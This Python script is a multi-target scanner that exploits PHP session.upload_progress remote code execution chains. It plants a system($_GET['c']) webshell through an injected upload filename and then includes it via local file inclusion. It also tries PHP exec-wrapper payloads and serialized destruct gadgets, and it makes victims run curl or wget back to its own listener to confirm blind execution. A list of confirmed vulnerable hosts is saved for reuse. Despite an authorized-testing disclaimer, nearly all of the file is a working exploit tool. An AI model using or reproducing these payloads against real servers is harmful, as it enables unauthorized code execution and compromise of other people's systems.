#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""Blind-capable multi-technique scanner for the PHP session.upload_progress
RCE chains (A + C).

Where scan_hosts.py trusts only markers echoed back in HTTP responses, this
scanner ALSO proves blind execution: the payload makes the target run
`curl <attacker-ip>:8000` against a listener this script opens, so RCE is
confirmed even when the target returns no output. Every attempt uses a
unique beacon path (`curl <ip>:8000/<tag>`), so a connection identifies
exactly which technique fired; one bare `curl <ip>:8000` attempt per chain
(attributed by peer IP) is also made. Supply your own beacon command with
--beacon (e.g. `--beacon 'curl <IP_ADDRESS>:8000'` — placeholders
<IP_ADDRESS>, <PORT>, <TAG> are substituted).

Techniques tried per target:
  chain A (needs any multipart POST endpoint + an application LFI):
    A1  webshell via filename injection (system($_GET['c'])) + LFI include
        -> verifiable marker, then blind beacons (bare `curl <ip>:8000`
        first, then a tagged one)
    A2  one-shot payloads with ALL exec wrappers (system, passthru,
        shell_exec, exec, popen, backticks) x BOTH injection vectors
        (filename, progress value) — used when the LFI endpoint is known
        (--a-lfi-path) but the webshell marker did not appear
    - the write endpoint and LFI endpoint are auto-probed from candidate
      lists unless given explicitly (--a-write-path / --a-lfi-path)
  chain C (needs php_serialize write dir + php read dir + preloaded
  destruct gadget):
    C1  verifiable marker via the ==PROOF== echo or --docker proof file
    C2  blind beacon: gadget cmd = `curl <ip>:8000` (bare, then tagged)
    (no filename vector here: serialized objects need `"` and filenames
    truncate at the first `"`)

Listener: TCP on --listen-host:--listen-port (default 0.0.0.0:8000); every
connection gets the reply body `BEACON-OK`, so a beacon is ALSO verifiable
in the response body when the execution channel returns output. Beacon
paths and peer IPs are recorded; `--ip` pins the target-visible attacker
address (otherwise auto-detected per target via the routing table).

The target needs a connect-back path to the listener (same network, or any
egress). `curl` or `wget` must exist on the target.

Verdicts: VULNERABLE (verifiable and/or blind evidence, with the exact
techniques listed), plus the usual precondition verdicts. Exit code 1 if
any host is VULNERABLE.

Examples:
  uv run scan_blind.py --hosts hosts.txt
  uv run scan_blind.py --target http://127.0.0.1:18081 --docker p2s2-lab
  uv run scan_blind.py --target 10.0.0.5:80 --ip 10.0.0.1 --listen-port 8000

For authorized testing only — scan only systems you own or may test.
"""
import argparse
import concurrent.futures
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from urllib.parse import urlparse, quote

B = "BLINDBOUND"
_print_lock = threading.Lock()


def say(msg):
    with _print_lock:
        print(msg, flush=True)


# ---------------------------------------------------------------- HTTP core
def send(host, port, method, path, body=b"", headers="", scheme="http",
         timeout=10.0, verify=False):
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return None
    if scheme == "https":
        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            sock = ctx.wrap_socket(sock, server_hostname=host)
        except (ssl.SSLError, OSError):
            sock.close()
            return None
    try:
        hosthdr = host if port in (80, 443) else f"{host}:{port}"
        hdr = (f"{method} {path} HTTP/1.1\r\nHost: {hosthdr}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n{headers}\r\n").encode()
        sock.sendall(hdr + body)
        sock.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = sock.recv(65536)
                if not d:
                    break
                resp += d
            except socket.timeout:
                break
        return resp
    except OSError:
        return None
    finally:
        sock.close()


def multipart(host, port, path, sid, progress, filename, **kw):
    body = (
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        f"Z\r\n"
        f"--{B}--\r\n"
    ).encode("latin-1")
    return send(host, port, "POST", path, body,
                f"Content-Type: multipart/form-data; boundary={B}\r\n", **kw)


def status_of(resp):
    try:
        return int(resp.split(b" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def body_of(resp):
    return resp.partition(b"\r\n\r\n")[2].decode("latin-1", "replace")


def session_cookie(resp):
    head = resp.partition(b"\r\n\r\n")[0].decode("latin-1", "replace")
    for line in head.split("\r\n"):
        if line.lower().startswith("set-cookie:"):
            m = re.search(r"PHPSESSID=([^;\s]+)", line, re.I)
            if m:
                return m.group(1)
    return None


def docker_exec(container, cmd):
    try:
        r = subprocess.run(["docker", "exec", container, "bash", "-c", cmd],
                           capture_output=True, text=True, timeout=30)
    except (OSError, subprocess.TimeoutExpired):
        return ""
    return (r.stdout + r.stderr).strip()


def parse_target(line):
    line = line.split("#", 1)[0].strip()  # full-line and inline comments
    if not line:
        return None
    if "://" not in line:
        line = "http://" + line
    u = urlparse(line)
    scheme = (u.scheme or "http").lower()
    if scheme not in ("http", "https") or not u.hostname:
        return None
    port = u.port or (443 if scheme == "https" else 80)
    return (scheme, u.hostname, port)


def nonce(n=3):
    return os.urandom(n).hex()


# ------------------------------------------------------- beacon listener
class BeaconListener(threading.Thread):
    """TCP listener that records every connection; GETs with a path are
    attributed to the technique whose tag matches the path."""

    def __init__(self, host, port):
        super().__init__(daemon=True)
        self.host, self.port = host, port
        self.lock = threading.Lock()
        self.tags = {}   # tag -> (peer, ts, request line)
        self.bare = []   # [(peer, ts, first line or "(no data)")]
        self.sock = None
        self.alive = True

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((self.host, self.port))
        except OSError as e:
            say(f"[-] listener bind {self.host}:{self.port} failed: {e} "
                f"— blind detection DISABLED, markers still active")
            self.alive = False
            return
        s.listen(64)
        s.settimeout(0.5)
        self.sock = s
        while self.alive:
            try:
                c, addr = s.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(c, addr), daemon=True).start()
        s.close()

    def _handle(self, c, addr):
        c.settimeout(5)
        try:
            data = c.recv(2048)
        except OSError:
            data = b""
        try:
            c.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 9\r\n\r\nBEACON-OK")
        except OSError:
            pass
        finally:
            c.close()
        line = data.split(b"\r\n", 1)[0].decode("latin-1", "replace").strip()
        parts = line.split(" ")
        if line.startswith(("GET", "POST", "HEAD")) and len(parts) >= 2:
            seg = parts[1].rstrip("/").rsplit("/", 1)[-1]
            if seg:
                with self.lock:
                    self.tags[seg] = (addr[0], time.time(), line)
                say(f"    [beacon] /{seg}  <-  {addr[0]}")
                return
        with self.lock:
            self.bare.append((addr[0], time.time(), line or "(no data)"))
        say(f"    [beacon] (bare)  <-  {addr[0]}  {line[:60]}")

    def get_tag(self, tag):
        with self.lock:
            return self.tags.get(tag)

    def bare_from(self, peers, since_ts):
        with self.lock:
            return [b for b in self.bare if b[0] in peers and b[1] >= since_ts]

    def stop(self):
        self.alive = False
        if self.sock:
            try:
                socket.create_connection(("127.0.0.1", self.port), timeout=1).close()
            except OSError:
                pass


# built-in beacon: quote-free so it fits the filename injection vector;
# wget fallback for targets without curl. Custom templates via --beacon.
DEFAULT_BEACON = ("curl -s -m 5 http://{IP}:{PORT}/{TAG} || "
                  "wget -T 5 -q -O /dev/null http://{IP}:{PORT}/{TAG}")


def template_has_tag(tpl):
    return "{TAG}" in tpl or "<TAG>" in tpl


def render_beacon(tpl, ip, port, tag):
    t = tpl.replace("{TAG}", tag or "").replace("<TAG>", tag or "")
    t = t.replace("{IP}", ip).replace("<IP_ADDRESS>", ip).replace("<IP>", ip)
    t = t.replace("{PORT}", str(port)).replace("<PORT>", str(port))
    return t


def beacon_cmd(args, ip, port, tag=None):
    return render_beacon(args.beacon or DEFAULT_BEACON, ip, port, tag)


def local_ip_for(host, port):
    """Best source-IP toward `host:port` (UDP connect = routing lookup only)."""
    try:
        infos = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_DGRAM)
        fam, typ, proto, _, addr = infos[0]
        s = socket.socket(fam, typ, proto)
        s.settimeout(2)
        s.connect(addr)
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return None


def resolve_ips(host):
    try:
        return {i[4][0] for i in socket.getaddrinfo(host, None)}
    except OSError:
        return {host}


def container_ips(container):
    """All IPs a docker container can source beacons from (for bare-beacon
    attribution; the listener sees the container IP, not the target URL)."""
    try:
        r = subprocess.run(
            ["docker", "inspect", "-f",
             "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}", container],
            capture_output=True, text=True, timeout=10)
        return {ip for ip in r.stdout.split() if ip}
    except (OSError, subprocess.TimeoutExpired):
        return set()


def docker_bridge_ip():
    """Host-side IP of the default docker bridge (target containers reach the
    host beacon listener through it)."""
    try:
        r = subprocess.run(
            ["bash", "-c",
             "ip -4 addr show docker0 2>/dev/null | grep -oP '(?<=inet )[\\d.]+' | head -1"],
            capture_output=True, text=True, timeout=10)
        ip = r.stdout.strip()
        return ip or None
    except (OSError, subprocess.TimeoutExpired):
        return None


# exec-wrapper templates: single-quote-safe ({c} is embedded in single quotes)
WRAPPERS = [
    ("system", "system('{c}');"),
    ("passthru", "passthru('{c}');"),
    ("shell_exec", "echo shell_exec('{c}');"),
    ("exec", "exec('{c}',$o);echo implode(chr(10),$o);"),
    ("popen", "$h=popen('{c}','r');while(!feof($h))echo fgets($h);"),
    ("backtick", "echo `{c}`;"),
]

WRITE_CANDIDATES = ["/chainA/index.php", "/chainW/up.php", "/", "/index.php",
                    "/upload.php", "/contact.php", "/form.php", "/comment.php"]
LFI_CANDIDATES = [("/chainA/lfi.php", "page"),
                  ("/index.php", "page"), ("/index.php", "file"),
                  ("/index.php", "include"), ("/index.php", "view"),
                  ("/lfi.php", "page"), ("/vuln.php", "page"),
                  ("/", "page"), ("/", "file"), ("/", "include")]
CW_CANDIDATES = ["/chainW/up.php"]
CR_CANDIDATES = ["/chainR/up.php"]


# ------------------------------------------------------------ chain A
def chain_a_phase(t, args, my_ip, lport, listener, peers):
    scheme, host, port = t
    res = {"verifiable": False, "blind": False, "techniques": [], "detail": []}

    # [1] write endpoint: explicit, or probe candidates (200 wins; docker
    # session-file check is definitive when available)
    if args.a_write_path:
        wp = args.a_write_path
    else:
        wp = None
        for cand in WRITE_CANDIDATES:
            sid = "scw" + nonce()
            r = multipart(host, port, cand, sid, "x", "probe.txt",
                          scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
            if r is None:
                continue
            if args.docker and docker_exec(
                    args.docker, f"test -f {args.save_path}/sess_{sid} && echo Y") == "Y":
                wp = cand
                break
            if status_of(r) == 200:
                wp = cand
                break
    res["write_path"] = wp
    if not wp:
        res["detail"].append("no multipart POST endpoint found among candidates")
        return res

    # [2] inject webshell (filename vector; single-quote only)
    sid = "scwa" + nonce()
    sess_file = f"{args.save_path}/sess_{sid}"
    mk = f"XUP42-{nonce()}"
    webshell = f"<?php echo 'XUP',(21*2),'-','{mk[6:]}';system($_GET['c']);?>"
    r = multipart(host, port, wp, sid, "x", webshell,
                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    if r is None:
        res["detail"].append("webshell injection request failed")
        return res
    cookie = session_cookie(r)
    res["sid"] = sid
    res["set_cookie"] = cookie
    res["fixation"] = ("body SID rejected (fresh Set-Cookie)" if cookie and cookie != sid
                       else "body SID accepted (echoed in Set-Cookie)" if cookie == sid
                       else "no Set-Cookie (body SID honored or cookies disabled)")
    res["detail"].append(f"write {wp} -> HTTP {status_of(r)}; {res['fixation']}")
    if args.docker:
        res["file_has_payload"] = webshell in docker_exec(
            args.docker, f"cat {sess_file} 2>/dev/null")

    # [3] LFI include: explicit endpoint or candidates; the webshell emits
    # the computed marker on ANY successful include (no reflection risk)
    lfi_cands = ([(args.a_lfi_path, args.a_lfi_param)]
                 if args.a_lfi_path else LFI_CANDIDATES)
    lfi = None
    for lp, lp_param in lfi_cands:
        r2 = send(host, port, "GET", f"{lp}?{lp_param}={quote(sess_file)}",
                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
        if r2 and mk in body_of(r2):
            lfi = (lp, lp_param)
            break
    if lfi:
        lp, lp_param = lfi
        res["verifiable"] = True
        res["techniques"].append(f"A1 webshell({wp}) + LFI {lp}?{lp_param} (marker {mk})")
        res["detail"].append(f"LFI include OK: {lp}?{lp_param}")

        # blind via webshell: bare beacon first (peer-attributed), exactly
        # the configured template with no tag
        since = time.time()
        r3 = send(host, port, "GET",
                  f"{lp}?{lp_param}={quote(sess_file)}&c={quote(beacon_cmd(args, my_ip, lport))}",
                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
        if r3 and "BEACON-OK" in body_of(r3):
            res["blind"] = True
            res["techniques"].append("A1 blind beacon via bare curl (response BEACON-OK)")
        else:
            time.sleep(args.settle)
            if listener and listener.bare_from(peers, since):
                res["blind"] = True
                res["techniques"].append("A1 blind beacon via bare curl <ip>:8000")
        # tagged beacon for exact attribution (only meaningful if the
        # template carries a <TAG> placeholder)
        if template_has_tag(args.beacon or DEFAULT_BEACON):
            tag = f"Aweb-{nonce(2)}"
            r4 = send(host, port, "GET",
                      f"{lp}?{lp_param}={quote(sess_file)}&c={quote(beacon_cmd(args, my_ip, lport, tag))}",
                      scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
            time.sleep(args.settle)
            hit = listener.get_tag(tag) if listener else None
            if hit or (r4 and "BEACON-OK" in body_of(r4)):
                res["blind"] = True
                res["techniques"].append(f"A1 tagged beacon ({tag})")
        return res

    # [4] fallback one-shot matrix: user-known LFI endpoint but no webshell
    # marker (unusual include context / stricter handlers) — ALL exec
    # wrappers x BOTH injection vectors, blind beacons only
    if not args.a_lfi_path:
        res["detail"].append("no LFI endpoint executed the payload "
                             f"({len(lfi_cands)} candidates tried)")
        return res
    lp, lp_param = args.a_lfi_path, args.a_lfi_param
    res["detail"].append(f"webshell marker absent; running one-shot matrix via {lp}?{lp_param}")
    has_tags = template_has_tag(args.beacon or DEFAULT_BEACON)
    for vec in ("filename", "progress"):
        for wname, wtpl in WRAPPERS:
            for _ in range(args.retries):
                tag = f"A{vec[0]}{wname[:3]}-{nonce(2)}" if has_tags else None
                cmd = beacon_cmd(args, my_ip, lport, tag)
                php = f"<?php {wtpl.format(c=cmd)} ?>"
                b_sid = "scba" + nonce()
                b_sess = f"{args.save_path}/sess_{b_sid}"
                if vec == "filename":
                    multipart(host, port, wp, b_sid, "x", php,
                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
                else:
                    multipart(host, port, wp, b_sid, php, "probe.txt",
                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
                since = time.time()
                rtrig = send(host, port, "GET", f"{lp}?{lp_param}={quote(b_sess)}",
                             scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
                if rtrig and "BEACON-OK" in body_of(rtrig):
                    hit = True
                else:
                    time.sleep(args.settle)
                    hit = bool(listener and
                               (listener.get_tag(tag) if tag else listener.bare_from(peers, since)))
                if hit:
                    res["blind"] = True
                    tech = f"A2 one-shot {vec}+{wname} " + \
                        (f"(beacon {tag})" if tag else "(custom beacon)")
                    if tech not in res["techniques"]:
                        res["techniques"].append(tech)
    return res


# ------------------------------------------------------------ chain C
def chain_c_phase(t, args, my_ip, lport, listener, peers):
    scheme, host, port = t
    res = {"verifiable": False, "blind": False, "techniques": [], "detail": []}

    cw = args.c_write_path
    if not cw:
        cw = next((c for c in CW_CANDIDATES
                   if (lambda r: r and status_of(r) == 200)(
                       send(host, port, "GET", c, scheme=scheme,
                            timeout=args.timeout, verify=args.verify_tls))), None)
    cr = args.c_read_path
    if not cr:
        cr = next((c for c in CR_CANDIDATES
                   if (lambda r: r and status_of(r) == 200)(
                       send(host, port, "GET", c, scheme=scheme,
                            timeout=args.timeout, verify=args.verify_tls))), None)
    res["detail"].append(f"endpoints: write={cw or 'none found'} read={cr or 'none found'}")
    if not (cw and cr):
        return res

    def gadget_for(cmd):
        cls, prop = args.gadget, args.gadget_prop
        cb, pb, nb = (x.encode("latin-1", "replace") for x in (cls, prop, cmd))
        g = (f'X|O:{len(cb)}:"'.encode() + cb + b'":1:{s:' + str(len(pb)).encode()
             + b':"' + pb + b'";s:' + str(len(nb)).encode() + b':"' + nb + b'";}')
        return g.decode("latin-1")

    # C1 verifiable: marker echo
    mk = f"XCH42-{nonce()}"
    sid = "scnc" + nonce()
    if args.docker:
        docker_exec(args.docker, f"rm -f {args.output_path}")
    r1 = multipart(host, port, cw, sid, gadget_for(f"echo {mk}"), "normal.txt",
                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    r2 = multipart(host, port, cr, sid, "x", "normal.txt",
                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    proof = ""
    if r2 is not None:
        out = body_of(r2)
        res["mismatch_warning"] = "Failed to decode session object" in out
        m = re.search(r"==PROOF==\r?\n(.*?)==/PROOF==", out, re.S)
        proof = m.group(1).strip() if m else ""
        if args.docker and not proof:
            time.sleep(0.5)
            proof = docker_exec(args.docker, f"cat {args.output_path} 2>/dev/null")
    res["detail"].append(f"C1 write HTTP {status_of(r1) if r1 else 0}, "
                         f"read HTTP {status_of(r2) if r2 else 0}, "
                         f"mismatch_warning={res.get('mismatch_warning')}")
    if mk in proof:
        res["verifiable"] = True
        res["techniques"].append(f"C1 gadget marker {mk} (proof echoed/file)")

    # C2/C3 blind: bare curl first (peer-attributed), then tagged when the
    # template carries a <TAG> placeholder
    has_tags = template_has_tag(args.beacon or DEFAULT_BEACON)
    for mode in (("bare", "tagged") if has_tags else ("bare",)):
        for _ in range(args.retries):
            tag = f"Cgad-{nonce(2)}" if mode == "tagged" else None
            cmd = beacon_cmd(args, my_ip, lport, tag)
            b_sid = "scbc" + nonce()
            multipart(host, port, cw, b_sid, gadget_for(cmd), "normal.txt",
                      scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
            since = time.time()
            rtrig = multipart(host, port, cr, b_sid, "x", "normal.txt",
                              scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
            if rtrig and "BEACON-OK" in body_of(rtrig):
                hit = True
            else:
                time.sleep(args.settle)
                hit = bool(listener and
                           (listener.get_tag(tag) if tag else listener.bare_from(peers, since)))
            if hit:
                res["blind"] = True
                if mode == "bare":
                    tech = (f"C2 blind beacon (bare `curl <ip>:{lport}`)"
                            if not args.beacon else f"C2 blind beacon (custom beacon)")
                else:
                    tech = f"C3 blind beacon (tagged {tag})"
                if tech not in res["techniques"]:
                    res["techniques"].append(tech)
    return res


# ------------------------------------------------------------ driver
def scan_target(t, args, listener):
    scheme, host, port = t
    label = f"{scheme}://{host}:{port}"
    entry = {"target": label, "techniques": []}

    r = send(host, port, "GET", "/", scheme=scheme, timeout=args.timeout,
             verify=args.verify_tls)
    if r is None:
        entry["verdict"] = "UNREACHABLE"
        return entry
    entry["root_status"] = status_of(r)

    my_ip = args.ip
    if not my_ip and host in ("127.0.0.1", "localhost", "::1") and args.docker:
        # a container's loopback is NOT the host; reach it via the bridge
        my_ip = docker_bridge_ip()
        if my_ip:
            entry["attacker_ip_source"] = f"docker0 bridge ({my_ip})"
    if not my_ip:
        my_ip = local_ip_for(host, port)
    entry["attacker_ip"] = my_ip
    entry["beacon_template"] = args.beacon or "built-in (curl||wget + tags)"
    if not my_ip:
        entry["verdict"] = "NO ROUTE TO TARGET (cannot pick beacon IP)"
        return entry
    say(f"[*] {label}: beacons -> {my_ip}:{args.listen_port}")

    # bare-beacon attribution: the listener sees the source IP, which is the
    # container IP (docker) or the resolved address of the target
    peers = resolve_ips(host)
    if args.docker:
        peers |= container_ips(args.docker)
    entry["peer_ips"] = sorted(peers)

    a = chain_a_phase(t, args, my_ip, args.listen_port, listener, peers)
    c = chain_c_phase(t, args, my_ip, args.listen_port, listener, peers)
    entry["chain_a"], entry["chain_c"] = a, c
    entry["techniques"] = a["techniques"] + c["techniques"]

    verifiable = a["verifiable"] or c["verifiable"]
    blind = a["blind"] or c["blind"]
    if verifiable or blind:
        entry["verdict"] = "VULNERABLE" + \
            (" (verifiable" + ("+blind)" if blind else ")") if verifiable
            else " (blind)")
    elif a.get("file_has_payload"):
        entry["verdict"] = "FIXATED+INJECTED (no LFI proof)"
    elif a.get("set_cookie") and a["set_cookie"] != a["sid"]:
        entry["verdict"] = "PATCHED? (body SID rejected)"
    elif c.get("mismatch_warning"):
        entry["verdict"] = "MISMATCH CONFIRMED (gadget did not fire)"
    else:
        entry["verdict"] = "NO SIGNALS"
    return entry


def format_entry(e):
    lines = [f"[{e['verdict']}] {e['target']}"
             + (f"  (root HTTP {e['root_status']})" if e.get("root_status") else "")
             + (f"  beacons->{e['attacker_ip']}" if e.get("attacker_ip") else "")]
    for chain in ("chain_a", "chain_c"):
        d = e.get(chain)
        if d:
            lines.append(f"    {chain[-1].upper()}: {'; '.join(d['techniques']) or 'no execution evidence'}")
            for bit in d["detail"]:
                lines.append(f"        {bit}")
    return "\n".join(lines)


def main():
    ap = argparse.ArgumentParser(
        description="Blind-capable multi-technique scanner for upload-progress chains A+C",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("targets", nargs="*",
                    help="target URLs (http://ip:port / https://domain; bare host = http)")
    ap.add_argument("--hosts", metavar="FILE",
                    help="file with one target per line (# comments ignored)")
    ap.add_argument("--listen-host", default="0.0.0.0",
                    help="beacon listener bind address (default 0.0.0.0)")
    ap.add_argument("--listen-port", type=int, default=8000,
                    help="beacon listener port (default 8000)")
    ap.add_argument("--ip", help="attacker IP as seen by targets "
                                 "(default: auto per target via routing)")
    ap.add_argument("--beacon", default=None,
                    help="custom beacon command, e.g. 'curl <IP_ADDRESS>:8000'; "
                         "placeholders <IP_ADDRESS> (or <IP>), <PORT>, <TAG> are "
                         "substituted. Without <TAG>, attempts are attributed by "
                         "timing window + peer IP (default: built-in curl||wget "
                         "with per-technique tags)")
    ap.add_argument("--settle", type=float, default=2.0,
                    help="seconds to wait for a beacon after each blind attempt")
    ap.add_argument("--retries", type=int, default=2,
                    help="repeats per blind technique (default 2)")
    ap.add_argument("--skip-a", action="store_true")
    ap.add_argument("--skip-c", action="store_true")
    ap.add_argument("--a-write-path", default=None,
                    help="multipart POST endpoint (default: auto-probe candidates)")
    ap.add_argument("--a-lfi-path", default=None,
                    help="LFI endpoint (default: auto-probe; required for A2 matrix)")
    ap.add_argument("--a-lfi-param", default="page")
    ap.add_argument("--save-path", default="/tmp/sess")
    ap.add_argument("--c-write-path", default=None, help="php_serialize dir (default: probe)")
    ap.add_argument("--c-read-path", default=None, help="php dir (default: probe)")
    ap.add_argument("--gadget", default="Evil", help="preloaded destruct gadget class")
    ap.add_argument("--gadget-prop", default="cmd")
    ap.add_argument("--output-path", default="/tmp/rce_proof")
    ap.add_argument("--docker", metavar="CONTAINER", help="docker exec checks")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--workers", type=int, default=4)
    ap.add_argument("--verify-tls", action="store_true")
    ap.add_argument("--json", metavar="FILE", help="write full results as JSON")
    ap.add_argument("--log", default="vulnerable.txt",
                    help="append VULNERABLE targets here, deduped across runs; "
                         "pass '' to disable (default: vulnerable.txt)")
    ap.add_argument("--quiet", action="store_true", help="only the final summary")
    args = ap.parse_args()

    for v in (args.gadget, args.gadget_prop):
        if "\r" in v or "\n" in v:
            print("[-] gadget class/property must not contain newlines", file=sys.stderr)
            sys.exit(2)

    lines = []
    if args.hosts:
        try:
            with open(args.hosts, encoding="utf-8") as f:
                lines = f.read().splitlines()
        except OSError as e:
            print(f"[-] cannot read {args.hosts}: {e}", file=sys.stderr)
            sys.exit(2)

    targets, seen = [], set()
    for line in lines + list(args.targets):
        t = parse_target(line)
        if t and t not in seen:
            seen.add(t)
            targets.append(t)
    if not targets:
        ap.error("no targets (pass URLs or use --hosts FILE)")

    # log: preload existing entries for dedupe
    log_path = args.log or None
    logged, new_logged, header_done = set(), 0, False
    if log_path:
        try:
            with open(log_path, encoding="utf-8") as f:
                for line in f:
                    t = parse_target(line)
                    if t:
                        logged.add(t)
        except FileNotFoundError:
            pass
        except OSError as e:
            print(f"[-] cannot read log {log_path}: {e}", file=sys.stderr)
            log_path = None

    listener = BeaconListener(args.listen_host, args.listen_port)
    listener.start()
    if listener.alive:
        say(f"[*] beacon listener on {args.listen_host}:{args.listen_port} "
            f"(reply body BEACON-OK; every connection is logged)")
    if args.beacon:
        say(f"[*] custom beacon: {args.beacon}")
        if not template_has_tag(args.beacon):
            say("[*]   no <TAG> placeholder -> attempts attributed by timing window + peer IP")
        if "'" in args.beacon or '"' in args.beacon:
            say("[!]   beacon contains quotes — filename-vector payloads break on "
                "quotes; progress-value attempts are unaffected")
        if not re.search(r"(:\d+|<PORT>|\{PORT\})", args.beacon):
            say(f"[!]   beacon has no port — make sure it targets the listener ({args.listen_port})")
    say(f"[*] scan_blind.py — all techniques: webshell + 6 exec wrappers x 2 "
        f"vectors (A), gadget (C), verifiable markers + blind beacons")
    say(f"[*] {len(targets)} target(s), workers={args.workers}, "
        f"settle={args.settle}s, retries={args.retries}")
    say(f"[*] authorized testing only: scan only systems you own or may test\n")

    results = []
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
            futs = {ex.submit(scan_target, t, args, listener): t for t in targets}
            for f in concurrent.futures.as_completed(futs):
                try:
                    entry = f.result()
                except Exception as e:
                    entry = {"target": f"{futs[f][0]}://{futs[f][1]}:{futs[f][2]}",
                             "verdict": f"ERROR ({e.__class__.__name__})"}
                results.append(entry)
                if not args.quiet:
                    say(format_entry(entry))
                if entry["verdict"].startswith("VULNERABLE") and log_path:
                    t = futs[f]
                    if t not in logged:
                        logged.add(t)
                        new_logged += 1
                        with open(log_path, "a", encoding="utf-8") as fh:
                            if not header_done:
                                fh.write(f"# {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
                                         f"vulnerable targets (one per line; reusable via --hosts)\n")
                                header_done = True
                            fh.write(f"{entry['target']}\n")
    finally:
        listener.stop()

    say("\n" + "=" * 78)
    for e in sorted(results, key=lambda x: x["target"]):
        say(format_entry(e))
    n_vuln = sum(1 for e in results if e["verdict"].startswith("VULNERABLE"))
    say(f"\n[*] done: {len(results)} scanned, {n_vuln} VULNERABLE "
        f"(exit code {1 if n_vuln else 0})")
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        say(f"[*] JSON written to {args.json}")
    if log_path:
        if new_logged:
            say(f"[*] {new_logged} vulnerable target(s) appended to {log_path}")
        else:
            say(f"[*] log {log_path}: no new vulnerable targets")
    sys.exit(1 if n_vuln else 0)


if __name__ == "__main__":
    main()
